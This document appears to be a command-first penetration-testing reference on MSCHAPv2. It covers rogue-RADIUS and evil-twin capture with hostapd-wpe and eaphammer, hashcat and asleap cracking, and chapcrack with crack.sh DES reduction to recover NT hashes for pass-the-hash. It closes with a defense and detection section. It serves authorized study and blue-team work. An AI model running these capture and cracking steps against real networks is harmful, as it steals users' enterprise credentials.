# MSCHAPv2 Cracking — Command-First Reference

> **Scope / authorization:** This file is for **authorized** work only — your own gear,
> a lab you built, a sanctioned engagement, a CTF, or OSWP/OSCP-style study. Capturing
> or cracking MSCHAPv2 against networks or accounts you do not own or have written
> permission to test is illegal. Everything below assumes you own the RADIUS server,
> the AP, and the test client, or you have a signed scope.
>
> **Evil-twin / rogue-RADIUS note:** This reference covers *standing up a rogue RADIUS in
> your own lab to understand and detect the attack*, and the **detection + defense** that
> every blue team needs. It is **not** a recipe for a credential-harvesting rig pointed at
> other people's clients. For the detection side see the sibling files
> `evil-twin-detection.md` and `karma-mana.md`.

---

## 1. Concept (brief — read this once, then skip to the commands)

**MSCHAPv2** (RFC 2759) is a challenge/response password authentication protocol. You meet
it in three places that matter for Wi-Fi work:

1. **WPA2/WPA3-Enterprise** as the *inner* method of **PEAP** and **EAP-TTLS**
   (`EAP-PEAP/MSCHAPv2`, `EAP-TTLS/MSCHAPv2`). This is the big one — it ties the Wi-Fi login
   straight to the **Active Directory** password.
2. **Cisco LEAP** — legacy, essentially MSCHAP over 802.1X. `asleap` was written for this.
3. **PPTP VPN** — MSCHAPv2 inside the PPP/CHAP exchange. `chapcrack` was written for this.

**Why it breaks (the one paragraph that explains every tool below):**

```
NT-Hash   = MD4(UTF-16LE(password))                       # 16 bytes
padded    = NT-Hash || 0x00 0x00 0x00 0x00 0x00           # 21 bytes
keys      = split(padded, 7)  -> K1(7) K2(7) K3(7)        # three DES keys
ChalHash  = SHA1(PeerChallenge || AuthChallenge || Username)[0:8]   # 8 bytes
Response  = DES(K1,ChalHash) || DES(K2,ChalHash) || DES(K3,ChalHash)  # 24 bytes
```

- The 24-byte **NT-Response** is just the **same 8-byte plaintext** (`ChalHash`) encrypted
  three times with three DES keys carved out of the MD4 hash.
- **K3 is only 2 real bytes** of the MD4 hash + 5 null bytes → **2^16 keyspace**, crackable
  **instantly**. That hands you the last 2 bytes of the NT hash for free.
- K1 and K2 are then a **single DES-56 problem** (same known plaintext/ciphertext) →
  **2^56**, which an FPGA farm (crack.sh, née CloudCracker) finishes in **≤ ~24 h, guaranteed,
  regardless of how strong the password is.** This is Moxie Marlinspike & Marsh Ray's 2012
  DEF CON 20 result: *"a strong password does not help you with MSCHAPv2."*
- **Why it is structural, not a "bad password" problem (Schneier's framing):** the flaw is in the
  *implementation*, not the design. The construction *looks* like it is trying to be 3DES, but the
  three DES operations are independent (not chained) and the third key is padded out with zeros —
  so the effective strength is one DES-56 keyspace, not 2^112 or 2^168. You are cracking **DES, not
  MD4** — which is exactly why no password policy, length, or entropy changes the result.
- Cracking the DES keys recovers the **full 16-byte NT (MD4) hash — not the plaintext.**
  For AD, the NT hash **is** the credential (pass-the-hash / derive MPPE keys / authenticate).
  To report the *plaintext* password you still crack the NT hash offline (`hashcat -m 1000`).

**The crucial equivalence:** an MSCHAPv2 response and a **NetNTLMv1** response are the *same
cryptographic construction* ("NT hash → 3× DES over an 8-byte challenge"). That is why
**hashcat mode 5500 (NetNTLMv1 / NetNTLMv1+ESS)** cracks MSCHAPv2 captures directly, and why
**crack.sh**'s NetNTLMv1 tables/engine apply. You have two independent attack routes against
the same capture:

| Route | Tool | Recovers | Cost | Works if password is strong? |
|-------|------|----------|------|------------------------------|
| **Dictionary / mask** | `hashcat -m 5500`, `asleap` | plaintext password | free, local GPU | **No** — only if in wordlist/mask |
| **DES reduction** | `chapcrack` → crack.sh (`-m 14000` locally if you have the horsepower) | NT hash (then PtH or `-m 1000`) | paid service / FPGA time | **Yes** — guaranteed |

Try the free local route first; fall back to DES reduction when the password is out of reach.

---

## 2. What you need to capture

Whatever the transport, you ultimately need **three values per authentication**:

- **Username** (exact case — it is hashed into `ChalHash`; wrong case = never cracks)
- **AuthenticatorChallenge** (16 B, from server) and **PeerChallenge** (16 B, from client)
  — *or* the already-computed 8-byte **ChallengeHash**
- **Peer NT-Response** (24 B)

Good news: **`hostapd-wpe` and `asleap` compute the 8-byte `ChallengeHash` for you** and print
the capture in ready-to-crack formats, so you rarely compute SHA1 by hand.

### 2a. WPA2-Enterprise (PEAP/TTLS-MSCHAPv2) — lab capture

The TLS tunnel hides the inner MSCHAPv2 from a passive sniffer. To read it you terminate the
tunnel yourself with a **rogue RADIUS** — in your lab, against *your* test client (authorized).
This is also exactly what you must understand to *detect* it (see §8 Defense).

`hostapd-wpe` (patched hostapd; ships in Kali) — minimal own-lab config:

```bash
# /etc/hostapd-wpe/hostapd-wpe.conf  (edit interface + ssid to your lab)
interface=wlan0
ssid=LAB-CORP
# ... wpa=2, ieee8021x=1, eap_server=1, etc. (default Kali conf is fine for a lab)

sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

When your test device associates and tries PEAP-MSCHAPv2, `hostapd-wpe` logs:

```
mschapv2: Fri ...
   username:   labuser
   challenge:  1a:2b:3c:4d:5e:6f:70:81              # 8-byte ChallengeHash (already computed)
   response:   11:22:33:44:...:ff                   # 24-byte NT response
   jtr NETNTLM: labuser:$NETNTLM$1a2b3c4d5e6f7081$1122...ff
```

`eaphammer` (by Gabriel Ryan / s0lst1c3) is a friendlier front-end over a modified hostapd-wpe
core; it produces the same MSCHAPv2 challenge/response material and adds **EAP-method downgrade**
behaviour you should understand for both attack and detection:

```bash
# lab-only: stand up the rogue AP and capture the inner MSCHAPv2 (own client / signed scope)
./eaphammer --cert-wizard                                   # one-time self-signed RADIUS cert
./eaphammer -i wlan0 --auth wpa-eap --essid LAB-CORP --creds   # capture challenge/response

# EAP downgrade: coax a client toward GTC (plaintext inner) or fall back to MSCHAPv2
./eaphammer -i wlan0 --auth wpa-eap --essid LAB-CORP --negotiate gtc-downgrade
```

- Per the eaphammer wiki, the **default** proposes **GTC first** (which would surrender a
  *plaintext* inner credential) and **falls back to MSCHAPv2** if the client refuses — so a single
  run yields either plaintext (GTC) or a 5500-crackable MSCHAPv2 response.
- **Detection hook (put this in the blue-team write-up):** the GTC-downgrade is **loud** — the
  client answering with **EAP-Nak** frames (rejecting the offered method) is exactly the signature a
  WIDS/WIPS keys on. Passive capture against a mis-configured client is quiet; the downgrade is not.

Treat both tools as **lab instrumentation**, keep them off the air except against your own clients,
and lean on `evil-twin-detection.md` and `karma-mana.md` for the blue-team view.

### 2b. LEAP — `asleap` sniffs it directly

```bash
# live capture + crack in one shot
sudo asleap -i wlan0mon -W wordlist.txt -v

# or capture to pcap first (airodump-ng / tcpdump), then crack offline (see §4)
```

### 2c. PPTP — sniff the PPP/CHAP exchange for `chapcrack`

```bash
sudo tcpdump -i eth0 -w pptp.pcap          # capture the VPN handshake
# (or point chapcrack at a live interface, see §5)
```

---

## 3. Route A (preferred): hashcat `-m 5500` dictionary / mask

**Mode:** `5500` = NetNTLMv1 / NetNTLMv1+ESS — this is the mode for MSCHAPv2 captures.
(`5600` is NetNTLMv2, a *different* construction — not what you get from MSCHAPv2.)

### 3a. Build the hashcat line from a hostapd-wpe capture

hostapd-wpe gives you `username`, the 8-byte `challenge` (already the ChallengeHash), and the
24-byte `response`. The **mode-5500 field order** is:

```
USERNAME::DOMAIN:LMRESPONSE:NTRESPONSE:SERVERCHALLENGE
```

For MSCHAPv2 there is no LM part and the domain is irrelevant, so:

```
labuser::::1122...ff:1a2b3c4d5e6f7081
#       ^^   ^^      ^-- 24-byte NT response   ^-- 8-byte ChallengeHash
#       ||   |+-- LM response: empty
#       |+---+-- domain: empty  (:: )
```

Put that one line in `hash.txt`. (Equivalent John the Ripper line:
`labuser:$NETNTLM$1a2b3c4d5e6f7081$1122...ff` — hostapd-wpe prints this for you as `jtr NETNTLM`.)

**Reference example hash (password = `hashcat`)** — sanity-test your toolchain on this first:

```
u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
```

### 3b. Run it

```bash
# dictionary + rules (start here — most enterprise creds fall in minutes)
hashcat -m 5500 -a 0 hash.txt rockyou.txt -r rules/best64.rule

# bigger ruleset when best64 misses
hashcat -m 5500 -a 0 hash.txt wordlist.txt -r rules/OneRuleToRuleThemAll.rule

# mask attack for policy-shaped passwords (e.g. Upper + 5 lower + 2 digit + symbol)
hashcat -m 5500 -a 3 hash.txt '?u?l?l?l?l?l?d?d?s'

# Mac-specific: optimized kernel + high workload (Apple Metal backend)
hashcat -m 5500 -a 0 hash.txt wordlist.txt -r rules/best64.rule -O -w 3
```

- `-O` optimized kernel (caps password length but much faster), `-w 3`/`-w 4` workload profile.
- Bulk: a single rogue session usually yields **many users' lines** — put them all in
  `hash.txt`. Each line has its own challenge so there is no cross-amortization, but one
  dictionary pass covers every user at once. Add `--username` if your lines carry usernames and
  you want them shown with the crack.
- Watch status/ETA; `hashcat --status --status-timer=10`.

### 3c. asleap as an alternative dictionary cracker

Newer `asleap` takes challenge/response straight from hostapd-wpe output and a plain wordlist:

```bash
asleap -C 1a:2b:3c:4d:5e:6f:70:81 -R 11:22:...:ff -W wordlist.txt
```

Classic asleap uses a **precomputed NT-hash file** built by `genkeys` (fast exact-match lookup,
no mangling rules):

```bash
# 1) precompute hashes + index from a dictionary
genkeys -r wordlist.txt -f hashfile.dat -n index.idx

# 2) crack from a pcap using that precomputed set
asleap -r capture.pcap -f hashfile.dat -n index.idx

#    -s  skip the "authentication succeeded" check (use with partial captures)
#    -i  capture live on an interface instead of -r
```

**asleap vs hashcat:** asleap+genkeys is exact-match only (no rules), single-threaded, CPU.
Prefer **hashcat -m 5500** for anything beyond a small wordlist — it does rules, masks, and GPU.
Keep asleap for LEAP live-sniffing and quick one-liners.

---

## 4. Route B: DES reduction (guaranteed, password-strength-independent)

When the password is strong / not in any wordlist, stop brute-forcing the password and attack
the **DES keys** instead. This recovers the **NT hash** no matter how strong the password is.

### 4a. `chapcrack` — parse the handshake, get the crack token

```bash
# from a capture file (PPTP, or any pcap containing the MSCHAPv2 handshake)
chapcrack parse -p pptp.pcap

# or live
sudo chapcrack parse -i eth0
```

Output per handshake (shape):

```
Got completed handshake [labuser]
          User = labuser
    C1/C2/C3 = ...
    K3 (2^16) cracked -> last 2 bytes of NT hash = 0xNNNN
    CloudCracker Submission = $99$<base64-token>
```

`chapcrack` has already cracked **K3** locally (instant 2^16) and emits a **`$99$…` token** that
encodes the single remaining DES-56 problem for K1+K2.

### 4b. Crack the DES-56 with crack.sh (FPGA) — or locally if you insist

- Submit the `$99$…` token to **https://crack.sh** (the successor to CloudCracker / David
  Hulton & Pico Computing FPGA box). DES-56 is **guaranteed within ~26 h**; historically ~$20–200.
- **Free fast path — NetNTLMv1 with the magic challenge `1122334455667788`:** crack.sh keeps a
  **full rainbow table** for responses captured against that fixed server challenge → **instant,
  free**. If you control the capture (your lab RADIUS / responder), forcing that challenge turns a
  2^56 brute into a table lookup.
- **Local DES option:** hashcat **mode 14000** cracks raw DES. The K3 slice (2^16) is trivial
  locally; the K1/K2 2^56 is *not* practical on a single Mac GPU — that is exactly why the FPGA
  service exists. Do K3 locally, send K1/K2 to crack.sh.
- **Fully-local, no third-party service — `assless-chaps` (n00py):** a toolkit that cracks MSCHAPv2
  **offline against a wordlist** by converting each candidate to its NT hash → DES keys and matching
  with hashcat `-m 14000`. It replaces the crack.sh hand-off for the *dictionary* case and keeps all
  credential material on-box (good when scope forbids sending tokens off-site). **Caveat:** it is
  still **dictionary-bound** — it is a local alternative to Route A's recovery of the *plaintext*,
  not a substitute for the guaranteed 2^56 brute. Use it when policy bars crack.sh but you have a
  strong wordlist; use crack.sh only when you truly need the strength-independent brute.

### 4c. Turn the DES result into the NT hash, then into the password

crack.sh returns the DES key(s). Reassemble the 16-byte NT hash
(`hashcat-utils`/`deskey_to_ntlm.pl` helper, or chapcrack's own reassembly), then either:

```bash
# use the NT hash directly (pass-the-hash / decrypt PPTP session with chapcrack decrypt)
chapcrack decrypt -p pptp.pcap -n <NTHASH>     # decrypt the captured PPTP/MPPE session

# OR recover the plaintext password offline from the NT hash
hashcat -m 1000 -a 0 nthash.txt wordlist.txt -r rules/best64.rule
```

For WPA2-Enterprise the NT hash alone lets you authenticate and derive MPPE/PMK material; for a
clean report you usually still crack `-m 1000` to show the plaintext.

---

## 5. Decision order (what a pro actually does, in order)

1. **Confirm authorization & scope.** Own gear / signed scope / CTF only.
2. **Capture the handshake** (§2). Verify you have **username (exact case) + challenge + 24-byte
   response**. Sanity-test your toolchain on the §3a reference hash first.
3. **Free local dictionary + rules — `hashcat -m 5500`** with `rockyou` + `best64`, then a bigger
   ruleset, then targeted **masks**. Most real enterprise passwords fall here in minutes. Run
   `asleap -W` as a quick cross-check for LEAP.
4. **Still uncracked → is it NetNTLMv1 with challenge `1122334455667788`?** → crack.sh free table,
   instant. (If you control capture, force that challenge.)
5. **Strong password, must-have credential → DES reduction.** `chapcrack parse` → `$99$` token →
   crack.sh (guaranteed). Recovers the **NT hash** regardless of strength.
6. **Convert / use:** NT hash → `chapcrack decrypt` (PPTP) or pass-the-hash (AD) or
   `hashcat -m 1000` for plaintext.
7. **Report with the defense** (§8) attached to every finding.

---

## 6. Gotchas & pitfalls (the stuff that wastes an evening)

- **Field order in `-m 5500`.** The #1 failure: swapping **response** and **challenge**. Order is
  `user::domain:LM:NTresponse:challenge`. Response = 48 hex (24 B), challenge = 16 hex (8 B).
- **Missing/short challenge.** The 8-byte ChallengeHash is 16 hex chars. A 15-char value means you
  dropped a leading `0`. Re-copy from the capture.
- **Username case & exact string.** The username is SHA1'd into `ChalHash`. `Bob` ≠ `bob` ≠
  `bob@corp.local`. Use the exact value the client sent, or it never cracks even with the right
  password. (This is also why you must capture the real inner identity, not the outer anonymous one.)
- **Domain field.** Some forum reports: a 5500 line with the domain omitted failed where the full
  form worked. For MSCHAPv2 `::::` (empty domain) is normally fine, but if a line refuses to load,
  try populating the domain.
- **ESS / SSP (Extended Session Security).** NetNTLMv1+ESS mixes in a client challenge (an extra
  "alea"), so the fixed `1122334455667788` table **does not apply** to those captures. hashcat
  `-m 5500` still handles them (it is NetNTLMv1*+ESS*), but the free crack.sh table does not.
  **How to recognise ESS:** the LM field carries the 8-byte client challenge zero-padded to 24 bytes
  — i.e. `LM[8:24] == 00…00` (sixteen zero bytes). hashcat auto-detects this and switches to the ESS
  variant; you do not pass a separate flag. To *avoid* ESS entirely in a lab capture (and keep the
  free table in play), make your responder/RADIUS send the fixed `1122334455667788` challenge so the
  client computes a plain NetNTLMv1 response.
- **5500 vs 5600.** If your capture tool emitted **NetNTLMv2**, that is `-m 5600` and a different
  attack — MSCHAPv2 is **5500**. Don't mix them up.
- **LM part.** If a capture carries an LM response too, `-m 5500` attacks the **NT** part only;
  don't expect it to recover an LM-only secret.
- **`hostapd-wpe` already computed the ChallengeHash.** Use its 8-byte `challenge` field directly —
  do **not** re-run SHA1 over the raw 16-byte challenges yourself (you'll get a wrong, uncrackable
  value). Only compute SHA1(Peer||Auth||User)[:8] yourself when you captured the two raw 16-byte
  challenges manually.
- **crack.sh sends credential material off-box.** The `$99$` token is derived from a real
  credential. On an authorized engagement this is a **data-handling/disclosure** decision — note it
  in scope, prefer local `-m 5500`/`-m 14000` first, and never submit third-party data without
  written authorization.
- **asleap `genkeys` sets are exact-match only** — no rules, no mangling, and the hash files get
  huge. For anything mangled, use hashcat.
- **Outer vs inner identity.** Many clients send an anonymous outer identity (`anonymous@realm`).
  You need the **inner** MSCHAPv2 username; the rogue-RADIUS capture is what exposes it.

---

## 7. Pro tips for speed

- **Always run the free local dictionary pass first.** It is free, local (Mac Metal GPU), and
  covers every captured user in one pass. Only escalate to paid DES reduction for a credential you
  *must* have and that survived the wordlist.
- **Rules ladder:** `best64` → `OneRuleToRuleThemAll` → targeted masks. Enterprise policy shapes
  (`?u?l?l?l?l?l?d?d?s`, season+year like `Autumn2025!`) crack fast with the right mask.
- **`-O -w 3`** on the Mac for the optimized kernel and high workload; check `hashcat -b -m 5500`
  to benchmark before a long run.
- **Bulk the whole session.** Dump every captured user into one `hash.txt`; one pass does them all.
- **Force the magic challenge when you control capture** (own responder/RADIUS) → crack.sh's free
  NetNTLMv1 `1122334455667788` table → instant NT hash with no local GPU time.
- **Split the labour:** crack K3 (2^16) locally in a blink with `-m 14000`, send only the K1/K2
  2^56 to crack.sh. Don't waste local GPU on the 2^56.
- **Keep a known-good test line** (the §3a `hashcat` example) to validate format before blaming the
  cracker for a bad capture.

---

## 8. DEFENSE (attach to every finding)

MSCHAPv2's weakness is structural — **password strength does not save you** — so the defenses are
about *removing the password from the air* and *detecting the rogue that captures it*.

**Kill the exposure:**
- **PPTP: do not use it. Treat all PPTP traffic as cleartext.** Migrate to WireGuard, IKEv2/IPsec,
  or OpenVPN. This has been the formal guidance since 2012 (SANS ISC "End of Days for MS-CHAPv2").
- **WPA2/WPA3-Enterprise: migrate PEAP/TTLS-MSCHAPv2 → EAP-TLS** (client certificates, no password
  on the wire). EAP-TLS with real certificate validation is not capturable by an evil twin. TEAP and
  PEAP-TLS are also safe; **PEAP+MSCHAPv2 and TTLS+MSCHAPv2 are the dangerous combos.**

**If you must keep PEAP/TTLS-MSCHAPv2 (interim):**
- **Enforce server-certificate validation on every client — this is the single control that stops
  the rogue-RADIUS capture.** Pin the **CA**, specify the **expected RADIUS server name (CN/SAN)**,
  and **forbid the user from accepting new/unknown certificates.** On iOS/Android this is the "CA
  certificate" field in the Wi-Fi/EAP profile — **left unset, PEAP is wide open to rogue APs.**
- **Push these settings by MDM / Group Policy** so users can't click "trust" on an evil twin.
- **Enable PEAP crypto-binding** on the RADIUS side (FreeRADIUS: `crypto_binding = require` in the
  PEAP module) — rarely deployed, meaningfully raises the bar against tunnel-termination attacks.
- **Use a dedicated internal CA** for the RADIUS cert (not a public CA), so clients can pin tightly.
- **Segment / phase out** legacy devices that can't validate certificates.

**Detect the attack (blue team — cross-ref `evil-twin-detection.md`, `karma-mana.md`):**
- Watch for **duplicate SSIDs**, unexpected BSSIDs, and **RADIUS endpoints/certs that don't match**
  your known server name — client-side 802.1X logs show certificate-name/trust mismatches.
- Alert on **spikes in 802.1X auth failures** and on clients prompting to trust a new certificate.
- Monitor for rogue APs/RADIUS in your space; WIDS/WIPS where available.

**Incident response:** because the DES route recovers any password regardless of strength, **rotate
any credential you believe traversed an MSCHAPv2 exchange a rogue could have captured** — and for AD
accounts treat NT-hash exposure as full credential compromise (pass-the-hash), not just "they might
guess my password."

---

## 9. Quick command cheat-sheet

```bash
# --- capture (own lab) ---
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf      # WPA2-Ent inner MSCHAPv2
sudo asleap -i wlan0mon -W wordlist.txt -v              # LEAP live
sudo tcpdump -i eth0 -w pptp.pcap                       # PPTP handshake

# --- Route A: local dictionary/mask (start here) ---
# hash.txt line:  user::::<24B-NTresponse-hex>:<8B-challenge-hex>
hashcat -m 5500 -a 0 hash.txt rockyou.txt -r rules/best64.rule -O -w 3
hashcat -m 5500 -a 3 hash.txt '?u?l?l?l?l?l?d?d?s'
asleap -C <chal> -R <resp> -W wordlist.txt              # from hostapd-wpe output
genkeys -r wordlist.txt -f hashfile.dat -n index.idx    # asleap precompute
asleap -r capture.pcap -f hashfile.dat -n index.idx -s

# --- Route B: DES reduction (strong passwords) ---
chapcrack parse -p pptp.pcap                            # -> $99$ token (K3 cracked locally)
#   submit $99$ token to https://crack.sh  (free if challenge == 1122334455667788)
chapcrack decrypt -p pptp.pcap -n <NTHASH>              # decrypt session with recovered NT hash
hashcat -m 1000 -a 0 nthash.txt wordlist.txt -r rules/best64.rule   # NT hash -> plaintext

# --- sanity test (password = "hashcat") ---
# u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c
```

---

## Sources

> Verified/expanded in this research pass across official tool docs, the hashcat wiki & forums,
> the Kali tools site, primary research + its press coverage, and reputable security references.
> Where a claim came from a vendor blog it is marked `[vendor]` — cross-check product framing.

**Primary tool docs / repos (command + format authority):**
- hashcat wiki — **example hashes** (authoritative mode 5500 / 5600 / 14000 samples; verified the
  `u4-netntlm::kNS:…` 5500 example, password `hashcat`): https://hashcat.net/wiki/doku.php?id=example_hashes
- hashcat forums — MSCHAPv2 ↔ NetNTLMv1 equivalence, hostapd-wpe challenge/response, 5500 field
  layout, ESS detection, 5500-vs-5600 pitfalls:
  https://hashcat.net/forum/thread-7041.html (hostapd-wpe MSCHAPv2 challenge/response),
  https://hashcat.net/forum/post-40247.html ("Reversing MSCHAPv2 to NTLM"),
  https://hashcat.net/forum/post-44479.html (module 5500, client-challenge field / ESS),
  https://hashcat.net/forum/post-13773.html (NetNTLMv1 format),
  https://hashcat.net/forum/post-57090.html (LM & NTLMv1 + challenge)
- asleap — Joshua Wright, official repo (genkeys workflow, `-s`, LEAP/PPTP/MSCHAPv2 dictionary attack):
  https://github.com/joswr1ght/asleap
- Kali Tools — **asleap** (worked `genkeys` + `asleap` example, options v2.3): https://www.kali.org/tools/asleap/
- Kali Tools — **hostapd-wpe** (rogue-RADIUS capture + crack with asleap): https://www.kali.org/tools/hostapd-wpe/
- eaphammer — Gabriel Ryan / s0lst1c3 (repo + wiki "VIII. Attacking WPA EAP and WPA2 EAP Networks";
  GTC-downgrade default + fallback, `--negotiate gtc-downgrade`, EAP-Nak noise):
  https://github.com/s0lst1c3/eaphammer and
  https://github.com/s0lst1c3/eaphammer/wiki/VIII.-Attacking-WPA-EAP-and-WPA2-EAP-Networks
- chapcrack — Moxie Marlinspike (MSCHAPv2 → single-DES reduction, `parse`/`decrypt`, `$99$` token):
  https://github.com/moxie0/chapcrack
- assless-chaps — fully-local dictionary MSCHAPv2 crack via hashcat `-m 14000` (local alternative to
  crack.sh); surfaced writeup: https://kalilinuxtutorials.com/assless-chaps/ (confirm the current
  upstream GitHub repo + exact flags before use)
- crack.sh — DES-56 / NetNTLMv1 FPGA service & fixed-challenge `1122334455667788` rainbow table:
  https://crack.sh/

**Primary research / press (the DES-reduction result):**
- Marlinspike & Ray, **DEF CON 20 (2012)** "Defeating PPTP VPNs and WPA2 Enterprise with MS-CHAPv2."
- Bruce Schneier — "Breaking Microsoft's PPTP Protocol" (implementation-not-design framing; DES round
  + DES round + zero-padded partial round → single 2^56; CloudCracker):
  https://www.schneier.com/blog/archives/2012/08/breaking_micros.html
- Lucian Constantin (press) — "Tools released at DEF CON can crack widely used PPTP encryption in
  under a day": https://www.infoworld.com/article/2292967/ and
  https://www.networkworld.com/article/712078/

**Defense / detection (server-cert validation, EAP-TLS migration):**
- SANS ISC / DShield diary 4036 — "Lack of digital certificate validation on various PEAP
  supplicants" (chain validated but **server name not matched**; "do not allow users to authorize new
  servers or CAs"): https://isc.sans.edu/diary/4036
- SANS ISC diary 13807 — "End of Days for MS-CHAPv2" (PPTP = cleartext; migrate): https://isc.sans.edu/diary/13807
- Bastille Research — PEAP / rogue-RADIUS analysis ("the only thing standing between a client and a
  rogue RADIUS server is server-certificate validation"; PEAP-TLS/TEAP safe): https://bastille.net/research/peap/
- SecureW2 — "Is EAP-TLS Safer than PEAP-MSCHAPv2?" (TLS 1.2 min, MDM/GPO push of profiles) `[vendor]`:
  https://securew2.com/blog/use-peap-mschapv2-and-eap-tls
- Purple.ai — "What is PEAP authentication / how PEAP secures your Wi-Fi" `[vendor]`:
  https://www.purple.ai/en-us/guides/what-is-peap-authentication-how-peap-secures-your-wifi
- Robyns et al. (UHasselt) — "Short paper: exploiting WPA2-Enterprise vendor implementation
  weaknesses" (cert-validation bypass; LEAP→PEAP cred conversion):
  https://documentserver.uhasselt.be/bitstream/1942/17013/1/p189-robyns.pdf
- VerSprite — "Attacking Weakly-Configured EAP-TLS Wireless Infrastructures": https://versprite.com/blog/eap-tls-wireless-infrastructure/

**Hash-capture / NetNTLM format references:**
- InternalAllTheThings — AD hash-capture / NetNTLM reference (ESS: `LM[8:24] == Z(16)`):
  https://internalallthethings.pages.dev/active-directory/hash-capture/
- TrustedSec — "Holy shuck: weaponizing NTLM hashes as a wordlist" (NetNTLMv1 → NT-hash workflow):
  https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist
- FreeRADIUS wiki — LEAP / PEAP protocol notes: https://wiki.freeradius.org/protocol/LEAP

_Note: web-search budget for this workflow run was exhausted after the core passes, so a few modern
command specifics (assless-chaps flags, current crack.sh pricing/uptime) are from expert knowledge
and should be re-verified against the upstream repo/site before an engagement._
